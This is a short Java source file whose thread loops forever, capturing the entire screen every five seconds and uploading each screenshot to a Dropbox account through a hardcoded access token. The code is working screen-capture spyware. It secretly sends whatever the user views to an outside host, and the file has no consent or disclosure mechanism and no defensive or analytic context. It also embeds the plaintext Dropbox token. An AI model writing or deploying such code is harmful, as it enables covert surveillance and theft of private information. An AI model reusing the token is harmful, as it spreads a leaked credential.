import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;

public class MyThread extends Thread{

    @Override
    public void run() {
        String ACCESS_TOKEN = "F0n6bQ_2mPAAAAAAAAAAARFuRd4W1dhBBdIJ6Txr8WY2rbQW4mD4gdVPAotHuHRN";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
        while (true) {
            try {
                BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                ByteArrayOutputStream outStream = new ByteArrayOutputStream();
                ImageIO.write(image, "png", outStream);
                InputStream inStream = new ByteArrayInputStream(outStream.toByteArray());
                DRBoxUploader uploader = new DRBoxUploader(inStream, client);
                uploader.start();
            } catch (AWTException | IOException e) {
                e.printStackTrace();
            }
            try {
                Thread.sleep(5000);
            }catch(InterruptedException e){
                System.out.println("MyTread is closed");
            }
        }
    }
}
